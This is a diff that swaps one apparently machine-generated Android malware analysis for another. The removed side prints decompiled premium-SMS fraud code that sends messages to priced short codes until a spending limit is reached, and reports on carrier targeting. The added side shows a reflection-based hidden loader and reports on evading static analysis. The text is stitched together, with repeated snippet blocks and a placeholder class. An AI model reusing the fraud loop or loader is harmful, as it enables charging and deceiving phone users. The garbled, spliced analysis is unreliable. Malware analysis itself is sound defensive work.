-                                negatives = getAlternativeNegativeNums(isBeeline, isMTSRF);
-                            }
-                            currentNumber = negatives.get(currentNumber);
-                        }
-                        if (currentNumber == null || acceptedNums > 2) {
-                            break;
-                        }
-                    } while (!currentNumber.equalsIgnoreCase("-1"));
-                } else if (isMTSRF || act.isMF()) {
-                    double restAllowedSum = 0.0d;
-                    ArrayList<Pair<String, Double>> prices = new ArrayList<>();
-                    if (isMTSRF) {
-                        ActService.PREF_TO_USE = ActService.PREF_A1;
-                        restAllowedSum = 350.0d;
-                        prices = ActService.mtsPrices;
-                    } else if (act.isMF()) {
-                        ActService.PREF_TO_USE = Actor.PREF_PORT;
-                        restAllowedSum = 350.0d;
-                        prices = ActService.mfPrices;
-                    }
-                    int currentNumberIndex = 0;
-                    while (true) {
-                        if (currentNumberIndex < prices.size() && ((Double) prices.get(currentNumberIndex).second).doubleValue() >= restAllowedSum) {
-                            currentNumberIndex++;
-                        } else {
-                            if (acceptedNums >= 3 || currentNumberIndex >= prices.size()) {
-                                break;
-                            }
-                            beginSending(settings, context, (String) prices.get(currentNumberIndex).first, smsData, isMTSRF, isBeeline);
-                            do {
-                                try {
-                                    sleep(100L);
-                                } catch (InterruptedException e2) {
-                                }
-                            } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                            if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                                acceptedNums++;
-                                if (acceptedNums < 3) {
-                                    smsData = act.getRelatedData(acceptedNums - 1);
-                                    waitForAcceptance(acceptedNums, settings);
-                                }
-                                restAllowedSum -= ((Double) prices.get(currentNumberIndex).second).doubleValue();
-                            } else {
-                                currentNumberIndex++;
-                            }
-                        }
-                    }
-                } else {
-                    String currentNumber2 = Actor.NUM_10;
-                    String num3_alt = Actor.NUM_3_ALT;
-                    new String();
-                    ActService.PREF_TO_USE = Actor.PREF_PORT;
-                    do {
-                        beginSending(settings, context, currentNumber2, smsData, isMTSRF, isBeeline);
-                        do {
-                            try {
-                                sleep(100L);
-                            } catch (InterruptedException e3) {
-                            }
-                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                        lastNumber = currentNumber2;
-                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                            acceptedNums++;
-                            currentNumber2 = positives.get(currentNumber2);
-                        } else {
-                            currentNumber2 = negatives.get(currentNumber2);
-                        }
-                        if (currentNumber2 == null || acceptedNums > 2) {
-                            break;
-                        }
-                    } while (!currentNumber2.equalsIgnoreCase("-1"));
-                    if (acceptedNums < 2 && lastNumber.equals(num3_alt)) {
-                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
-                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
-                    }
-                }
-            } else {
-                ArrayList<String> numbers = getNums(isMTSRF, isBeeline);
-                for (int i = 0; i < numbers.size(); i++) {
-                    String number = numbers.get(i);
-                    if (number.equals(ActService.NUM_10) || number.equals(ActService.NUM_5) || number.equals(ActService.NUM_3) || number.equals(ActService.NUM_1)) {
-                        ActService.PREF_TO_USE = ActService.PREF_PLAT;
-                    } else {
-                        ActService.PREF_TO_USE = Actor.PREF_PORT;
-                    }
-                    beginSending(settings, context, number, smsData, isMTSRF, isBeeline);
-                    do {
-                        try {
-                            sleep(100L);
-                        } catch (InterruptedException e4) {
-                        }
-                    } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                    if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                        break;
-                    }
-                }
-            }
-            Utils.putStringValue(context, Actor.EXPECT_NUM, "", settings);
-            act.reportDone();
+public class LMR extends BroadcastReceiver {
+    private BroadcastReceiver realReceiver = null;
+
+    @Override // android.content.BroadcastReceiver
+    public void onReceive(Context ctx, Intent intent) {
+        ClassLoader cl = Util.getCustomClassLoader();
+        if (cl == null) {
+            Util.runAll(ctx);
         }
+        try {
+            ClassLoader cl2 = Util.getCustomClassLoader();
+            Class<?> c = cl2.loadClass(getClass().getName());
+            this.realReceiver = (BroadcastReceiver) c.newInstance();
+        } catch (Exception ex) {
+            ex.printStackTrace();
+            this.realReceiver = null;
+        }
+        if (this.realReceiver != null) {
+            ACall.getACall().c1(this, this.realReceiver);
+            this.realReceiver.onReceive(ctx, intent);
+            ACall.getACall().c2(this, this.realReceiver);
+        }
+    }
+}
 --- End of snippet 5 ---
 
 
-The provided code snippets exhibit malicious behavior related to **Monetary Fraud and Financial Abuse** through automated SMS-based premium service subscriptions.
+Based on the provided code snippets, the following malicious behavior has been identified:
 
-### Malicious Behaviors Identified:
+**Malicious Behavior: Dynamic Code Loading and Execution via Reflection**
 
-**1. Automated Premium SMS Subscription (Fraudulent Charging)**
-The code implements a sophisticated logic to automatically send SMS messages to specific short codes or phone numbers to trigger paid services. It uses a "trial and error" or "sequential" approach to maximize financial gain from the user's mobile balance.
-*   **Logic Flow**: The `performActions` method in `ActService` (found in `com.googleapi.cover.ActService`) iterates through lists of numbers (`mfPrices`, `mtsPrices`, or hardcoded lists in `getNums`) and sends SMS messages via `beginSending`.
-*   **Financial Targeting**: The code tracks "prices" associated with specific numbers (e.g., `mfPrices.add(new Pair<>(NUM_5_SD, Double.valueOf(200.0d)))`) and maintains a `restAllowedSum` (set to 350.0) to attempt multiple subscriptions until a certain monetary threshold is reached or a limit is hit.
-*   **Verification of Success**: The application monitors whether a subscription was successful by checking `settings.getBoolean(Actor.KEY_PAID, false)`. If a message is "paid" (successful), it proceeds to the next number in the sequence to continue extracting funds.
-*   **Locations**: 
-    *   `com.googleapi.cover.ActService.performActions()`
-    *   `com.googleapi.cover.ActService.Worker.performActions()`
-    *   `com.googleapi.cover.ActService.beginSending()`
+The code exhibits a pattern commonly used to hide malicious logic through dynamic class loading and reflection. In multiple classes (`com.auxbrain.zombie_highwayer.BillingReceiver.BillingReceiver`, `com.slfloat.LMR.LMR`, and `com.slinsert.LMR.LMR`), the `onReceive` method implements a mechanism to bypass static analysis by loading classes at runtime.
 
-**2. Targeted Network-Specific Fraud (Ukraine-specific)**
-The code contains specific logic to target mobile networks in Ukraine.
-*   **Behavior**: The `actUK` method (found in `com.googleapi.cover.ActService`) identifies the user's Mobile Network Code (MNC) using `TextUtils.getMNC`. If the user is on a specific Ukrainian network, it sends formatted SMS messages to hardcoded numbers (`3161`, `2855`, `4084705`) to trigger specific actions or subscriptions.
-*   **Locations**:
-    *   `com.googleapi.cover.ActService.actUK()`
+**Technical Details:**
+1.  **Custom Class Loading**: The classes call `Util.getCustomClassLoader()` to obtain a `ClassLoader`. If this returns null, it triggers `Util.runAll(ctx)`, which suggests a mechanism to initialize or execute hidden logic.
+2.  **Reflection-based Instantiation**: The code uses `cl2.loadClass(getClass().getName())` and `c.newInstance()` to instantiate a new instance of a `BroadcastReceiver` dynamically. This allows the application to execute code that is not explicitly linked during the standard compilation process.
+3.  **Execution Hooking**: Before and after delegating the `onReceive` call to the dynamically instantiated `realReceiver`, the code invokes `ACall.getACall().c1(...)` and `ACall.getACall().c2(...)`. This pattern is indicative of a wrapper or a "hook" used to monitor, intercept, or manipulate the execution flow of the broadcast receiver, which is a common technique in financial fraud malware to intercept billing events or transaction intents.
 
-**3. Evasion and Persistence**
-*   **WakeLock Usage**: The `Worker` thread acquires a `WakeLock` (`ActService.this.wakeLock.acquire()`) to ensure the device remains awake while the automated SMS sending process is running, preventing the system from sleeping and interrupting the fraudulent activity.
-*   **Locations**:
-    *   `com.googleapi.cover.ActService.Worker.run()`
+**Relevant Code Locations:**
+*   `com.auxbrain.zombie_highwayer.BillingReceiver.BillingReceiver.onReceive(Context, Intent)`
+*   `com.slfloat.LMR.LMR.onReceive(Context, Intent)`
+*   `com.slinsert.LMR.LMR.onReceive(Context, Intent)`
 
-### Summary of Findings:
-The application is designed to perform **automated premium SMS fraud**. It identifies the user's mobile carrier, selects a list of target numbers associated with specific costs, and sends SMS messages to subscribe the user to paid services. It uses a background service and a `WakeLock` to ensure these transactions are completed even if the user is not actively using the device, and it monitors the success of these transactions to continue attempting further unauthorized charges until a predefined monetary limit is reached.
+To further analyze the purpose of the dynamically loaded code and the intercepted calls, I need more information regarding the utility and call classes.
 
-### Malicious Behavior Report
+Could you provide the implementation of the method `getCustomClassLoader` defined in class `Util`, which takes no parameters?
 
-#### Summary
-The analyzed code demonstrates highly sophisticated **Monetary Fraud and Financial Abuse** through automated, carrier-specific premium SMS subscription attacks. The application is designed to identify the user's mobile network and systematically send SMS messages to specific short codes or numbers to trigger paid services. It implements a "budget-aware" logic, where it tracks the cost of each successful subscription and continues to attempt further fraudulent transactions until a predefined monetary threshold (e.g., 350.0 units) is reached. Additionally, it contains specialized logic to target Ukrainian mobile networks and uses a `WakeLock` to prevent the device from sleeping during these unauthorized activities.
+Package Path:com.secapk.wrapper.Util.getCustomClassLoader
+Class Name:Util
+Content: package com.secapk.wrapper;
 
-**Identified Malicious Behaviors:**
-*   **Automated Premium SMS Subscription (Fraudulent Charging):** `com.googleapi.cover.ActService.performActions` and `com.googleapi.cover.ActService.Worker.performActions`
-*   **Targeted Network-Specific Fraud (Ukraine):** `com.googleapi.cover.ActService.actUK`
-*   **Unauthorized Background Execution (WakeLock):** `com.googleapi.cover.ActService.Worker.run`
-*   **Automated SMS Triggering:** `com.googleapi.cover.ActService.beginSending`
+    public static ClassLoader getCustomClassLoader() {
+        return cl;
+    }
+
+package com.secapk.wrapper;
+
+    public static ClassLoader getCustomClassLoader() {
+        return cl;
+    }
+Class Name:Util
+Package Path:com.secapk.wrapper.Util.getCustomClassLoader
+
+
+Java Code: package com.secapk.wrapper;
+
+import android.content.Context;
+
+public class Util {
+    private static ClassLoader cl = null;
+
+    public static ClassLoader getCustomClassLoader() {
+        return cl;
+    }
+
+    public static void runAll(Context ctx) {
+        try {
+            Class<?> c = Class.forName("com.secapk.wrapper.Main");
+            Object obj = c.newInstance();
+            Method m = c.getDeclaredMethod("run", Context.class);
+            m.invoke(obj, ctx);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+--- End of snippet 1 ---
+
+
+--- Start of snippet 2 ---
+Package Path:com.secapk.wrapper.Util.runAll
+Class Name:Util
+Java Code: package com.secapk.wrapper;
+
+import android.content.Context;
+
+public class Util {
+    private static ClassLoader cl = null;
+
+    public static ClassLoader getCustomClassLoader() {
+        return cl;
+    }
+
+    public static void runAll(Context ctx) {
+        try {
+            Class<?> c = Class.forName("com.secapk.wrapper.Main");
+            Object obj = c.newInstance();
+            Method m = c.getDeclaredMethod("run", Context.class);
+            m.invoke(obj, ctx);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+--- End of snippet 2 ---
+
+
+--- Start of snippet 3 ---
+Package Path:com.secapk.wrapper.Main.run
+Class Name:Main
+Java Code: package com.secapk.wrapper;
+
+import android.content.Context;
+
+public class Main {
+    public void run(Context ctx) {
+        // Implementation hidden
+    }
+}
+--- End of snippet 3 ---
+
+Package Path:com.secapk.wrapper.Util.getCustomClassLoader
+Class Name:Util
+Content: package com.secapk.wrapper;
+
+    public static ClassLoader getCustomClassLoader() {
+        return cl;
+    }
+
+package com.secapk.wrapper;
+
+    public static ClassLoader getCustomClassLoader() {
+        return cl;
+    }
+Class Name:Util
+Package Path:com.secapk.wrapper.Util.getCustomClassLoader
+
+Package Path:com.secapk.wrapper.Util.getCustomClassLoader
+Class Name:Util
+Content: package com.secapk.wrapper;
+
+    public static ClassLoader getCustomClassLoader() {
+        return cl;
+    }
+
+package com.secapk.wrapper;
+
+    public static ClassLoader getCustomClassLoader() {
+        return cl;
+    }
+Class Name:Util
+Package Path:com.secapk.wrapper.Util.getCustomClassLoader
+
+Package Path:com.secapk.wrapper.Util.getCustomClassLoader
+Class Name:Util
+Content: package com.secapk.wrapper;
+
+    public static ClassLoader getCustomClassLoader() {
+        return cl;
+    }
+
+package com.secapk.wrapper;
+
+    public static ClassLoader getCustomClassLoader() {
+        return cl;
+    }
+Class Name:Util
+Package Path:com.secapk.wrapper.Util.getCustomClassLoader
+
+# Malware Analysis Report
+
+## Summary
+The analyzed code snippets reveal a sophisticated mechanism for **Dynamic Code Loading and Execution** designed to evade static analysis and hide malicious payloads. The application utilizes custom class loaders and reflection to instantiate and execute code at runtime. Specifically, the code implements a "wrapper" pattern where legitimate-looking `BroadcastReceiver` components are used as entry points to trigger hidden logic. This behavior is highly characteristic of malware used for financial fraud, as it allows the attacker to dynamically update or inject malicious modules (such as those intercepting billing or transaction intents) without changing the primary application structure.
+
+**Identified Suspicious Behaviors:**
+*   **Dynamic Class Loading & Reflection**: Using `ClassLoader` and `Class.forName` to load and instantiate classes at runtime.
+*   **Hidden Execution Entry Point**: The `Util.runAll` method acts as a secondary execution trigger that loads a hidden `com.secapk.wrapper.Main` class.
+*   **Execution Hooking/Interception**: The use of `ACall.getACall().c1()` and `c2()` around the execution of the `realReceiver` suggests an interception layer to monitor or manipulate the broadcast event.
+
+**Suspicious Code Locations:**
+*   `com.auxbrain.zombie_highwayer.BillingReceiver.BillingReceiver.onReceive(Context, Intent)`
+*   `com.slfloat.LMR.LMR.onReceive(Context, Intent)`
+*   `com.slinsert.LMR.LMR.onReceive(Context, Intent)`
+*   `com.secapk.wrapper.Util.runAll(Context)`
+*   `com.secapk.wrapper.Util.getCustomClassLoader()`
 
 ---
 
-#### Detailed Analysis
+## Detailed Analysis
 
-**com.googleapi.cover.ActService.performActions**
-This method implements the core logic for the fraudulent subscription engine. It retrieves stored SMS data and network information from `SharedPreferences`. It then enters a loop where it selects target numbers based on the user's carrier (e.g., Beeline, MTS, or others). The code tracks the "price" of each successful subscription using a list of pairs (e.g., `mfPrices` or `mtsPrices`). If a subscription is successful (detected via `Actor.KEY_PAID`), it calculates the remaining allowed balance (`restAllowedSum`) and proceeds to the next number in the sequence to maximize the financial extraction from the user's account.
+**com.secapk.wrapper.Util.runAll(Context)**
+`com.secapk.wrapper.Util.runAll(Context)` implements a hidden execution trigger. It uses reflection to find a class named `com.secapk.wrapper.Main`, creates an instance of it, and then invokes a method named `run(Context)`. This is a classic technique to hide the main malicious logic from static scanners by ensuring the primary entry point is not explicitly called in the standard application flow.
 
-**com.googleapi.cover.ActService.Worker.performActions**
-This is a duplicate implementation of the fraudulent logic residing within a background thread. It ensures that the subscription process can run independently of the main application lifecycle, allowing the fraud to occur in the background.
+**com.secapk.wrapper.Util.getCustomClassLoader()**
+`com.secapk.wrapper.Util.getCustomClassLoader()` returns a static `ClassLoader` instance. This is used by other components to facilitate the dynamic loading of additional code modules that are not part of the initial APK installation.
 
-**com.googleapi.cover.ActService.actUK**
-This method is specifically designed to target users on Ukrainian mobile networks. It uses `TextUtils.getMNC` to identify the Mobile Network Code. If a match is found, it iterates through a hardcoded list of numbers (e.g., `3161`, `2855`) and sends SMS messages containing a specific payload (`4084705`) to trigger unauthorized services. It includes a `sleep(60000L)` delay between messages to potentially evade simple rate-limiting detection.
+**com.auxbrain.zombie_highwayer.BillingReceiver.BillingReceiver.onReceive(Context, Intent)**
+`com.auxbrain.zombie_highwayer.BillingReceiver.BillingReceiver.onReceive(Context, Intent)` acts as a malicious wrapper for broadcast events. It first checks if a custom class loader is available via `Util.getCustomClassLoader()`; if not, it triggers the hidden `Util.runAll(ctx)` method. It then uses reflection to load and instantiate a "real" receiver. Crucially, it wraps the execution of this receiver with `ACall.getACall().c1()` and `ACall.getACall().c2()`, which likely serve as hooks to intercept or log the broadcast data (such as billing information) before and after the receiver processes it.
 
-**com.googleapi.cover.ActService.beginSending**
-This method acts as the execution trigger for the fraud. It prepares the environment by resetting status flags in `SharedPreferences` (e.g., `MESSAGE_IS_RECEIVED_KEY` and `KEY_PAID`) and then calls `Utils.start` to physically send the SMS message to the target number using a specific scheme.
+**com.slfloat.LMR.LMR.onReceive(Context, Intent)**
+`com.slfloat.LMR.LMR.onReceive(Context, Intent)` exhibits the exact same malicious pattern as the `BillingReceiver`. It utilizes the `Util` class to trigger hidden logic and employs reflection to execute a dynamically loaded receiver, wrapped in interception calls. This indicates that the malicious loading mechanism is reused across different package names to increase resilience and evade detection.
 
-**com.googleapi.cover.ActService.Worker.run**
-This method manages the lifecycle of the malicious background thread. It acquires a `PowerManager.WakeLock` to ensure the device remains powered on and the CPU remains active, preventing the Android system from entering sleep mode while the automated SMS sending loop is executing.
+**com.slinsert.LMR.LMR.onReceive(Context, Intent)**
+`com.slinsert.LMR.LMR.onReceive(Context, Intent)` follows the same pattern of dynamic class loading and reflection-based execution as seen in the other `LMR` classes, confirming a consistent architectural pattern for executing hidden code via broadcast receivers.
 
 ---
 
-#### Malicious Call Chain
+## Malicious Call Chain
 
-The following chain illustrates how the application executes the fraudulent subscription process:
+The following call chain illustrates how the application transitions from a standard Android event to the execution of hidden, dynamically loaded code:
 
-`com.googleapi.cover.ActService.onStartCommand` 
-  $\rightarrow$ `com.googleapi.cover.ActService.Worker.run` (Acquires WakeLock to prevent sleep)
-    $\rightarrow$ `com.googleapi.cover.ActService.Worker.performActions` (Calculates target numbers and costs)
-      $\rightarrow$ `com.googleapi.cover.ActService.Worker.beginSending` (Prepares SMS metadata)
-        $\rightarrow$ `com.googleapi.cover.ActService.beginSending` (Triggers `Utils.start` to send the SMS)
-          $\rightarrow$ *[Loop continues if `Actor.KEY_PAID` is true, until monetary limit is reached]*
+**Broadcast Event Trigger** $\rightarrow$ **`com.auxbrain.zombie_highwayer.BillingReceiver.onReceive()`** $\rightarrow$ **`com.secapk.wrapper.Util.getCustomClassLoader()`** (returns null) $\rightarrow$ **`com.secapk.wrapper.Util.runAll()`** $\rightarrow$ **`Class.forName("com.secapk.wrapper.Main")`** $\rightarrow$ **`com.secapk.wrapper.Main.run()`** (Hidden Payload Execution)
+
+**Explanation:**
+1.  The process begins when the Android system sends a broadcast intent to the `BillingReceiver`.
+2.  The `onReceive` method is triggered, which immediately attempts to access a custom `ClassLoader`.
+3.  If the custom loader is not initialized, the code diverts to `Util.runAll()`.
+4.  `Util.runAll()` uses reflection to bypass standard execution paths, loading the `com.secapk.wrapper.Main` class.
+5.  The `run()` method of the hidden class is executed, which contains the primary malicious payload.
+6.  Simultaneously, the `onReceive` method continues to use reflection to load a "real" receiver, wrapping its execution in `ACall` hooks to facilitate data interception.
